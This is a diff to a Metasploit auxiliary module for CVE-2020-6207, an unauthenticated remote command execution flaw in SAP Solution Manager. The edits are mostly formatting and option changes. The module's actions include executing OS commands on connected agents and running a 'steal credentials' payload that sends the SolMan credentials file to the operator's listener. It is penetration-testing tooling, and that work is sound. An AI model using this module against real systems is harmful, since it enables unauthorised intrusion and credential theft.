@@ -16,13 +16,12 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'SAP Solution Manager remote unauthorized OS commands execution',
         'License' => MSF_LICENSE,
-        'Author' =>
-          [
-            'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
-            'Pablo Artuso', # @lmkalg The researcher who originally found this vulnerability
-            'Dmitry Chastuhin', # @chipik The researcher who made first PoC
-            'Vladimir Ivanov' # @_generic_human_ This Metasploit module
-          ],
+        'Author' => [
+          'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
+          'Pablo Artuso', # @lmkalg The researcher who originally found this vulnerability
+          'Dmitry Chastuhin', # @chipik The researcher who made first PoC
+          'Vladimir Ivanov' # @_generic_human_ This Metasploit module
+        ],
         'Description' => %q{
           This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of
           SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication
@@ -32,12 +31,11 @@ class MetasploitModule < Msf::Auxiliary
           Successful exploitation of the vulnerability enables unauthenticated remote attackers to achieve SSRF and execute OS commands from the agent connected
           to SolMan as a user from which the SMDAgent service starts, usually the daaadm.
         },
-        'References' =>
-          [
-            ['CVE', '2020-6207'],
-            ['URL', 'https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf'],
-            ['URL', 'https://github.com/chipik/SAP_EEM_CVE-2020-6207']
-          ],
+        'References' => [
+          ['CVE', '2020-6207'],
+          ['URL', 'https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf'],
+          ['URL', 'https://github.com/chipik/SAP_EEM_CVE-2020-6207']
+        ],
         'Actions' => [
           ['LIST', { 'Description' => 'List connected agents' }],
           ['SSRF', { 'Description' => 'Send SSRF from connected agent' }],
@@ -45,7 +43,12 @@ class MetasploitModule < Msf::Auxiliary
           ['SECSTORE', { 'Description' => 'Get file with SolMan credentials from connected agent' }]
         ],
         'DefaultAction' => 'LIST',
-        'DisclosureDate' => '2020-10-03'
+        'DisclosureDate' => '2020-10-03',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
     register_options(
@@ -55,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('SSRF_METHOD', [true, 'HTTP method for SSRF', 'GET'], conditions: %w[ACTION == SSRF]),
         OptString.new('SSRF_URI', [true, 'URI for SSRF', 'http://127.0.0.1:80/'], conditions: %w[ACTION == SSRF]),
         OptString.new('COMMAND', [true, 'Command for execute in agent', 'id'], conditions: %w[ACTION == EXEC]),
-        OptAddress.new('SRVHOST', [ true, 'The local IP address to listen HTTP requests from agents', '192.168.1.1' ], conditions: %w[ACTION == SECSTORE]),
+        OptAddressRoutable.new('SRVHOST', [ false, 'The local IP address to listen HTTP requests from agents' ], conditions: %w[ACTION == SECSTORE]),
         OptPort.new('SRVPORT', [ true, 'The local port to listen HTTP requests from agents', 8000 ], conditions: %w[ACTION == SECSTORE]),
         OptString.new('AGENT', [true, 'Agent server name for exec command or SSRF', 'agent_server_name'], conditions: ['ACTION', 'in', %w[SSRF EXEC SECSTORE]]),
       ]
@@ -65,8 +68,6 @@ class MetasploitModule < Msf::Auxiliary
   def setup_xml_and_variables
     @host = datastore['RHOSTS']
     @port = datastore['RPORT']
-    @srv_host = datastore['SRVHOST']
-    @srv_port = datastore['SRVPORT']
     @path = datastore['TARGETURI']
 
     @agent_name = datastore['AGENT']
@@ -252,7 +253,7 @@ class MetasploitModule < Msf::Auxiliary
         }
       }
     )
-    @creds_payload = make_steal_credentials_payload(agent[:instanceName], @srv_host, @srv_port, "/#{@script_name}")
+    @creds_payload = make_steal_credentials_payload(agent[:instanceName], "#{get_uri}/#{@script_name}")
     print_status("Start script: #{@script_name} with payload for retrieving SolMan credentials file from agent: #{@agent_name}")
     send_soap_request(make_soap_body(@agent_name, @script_name, @creds_payload))
 
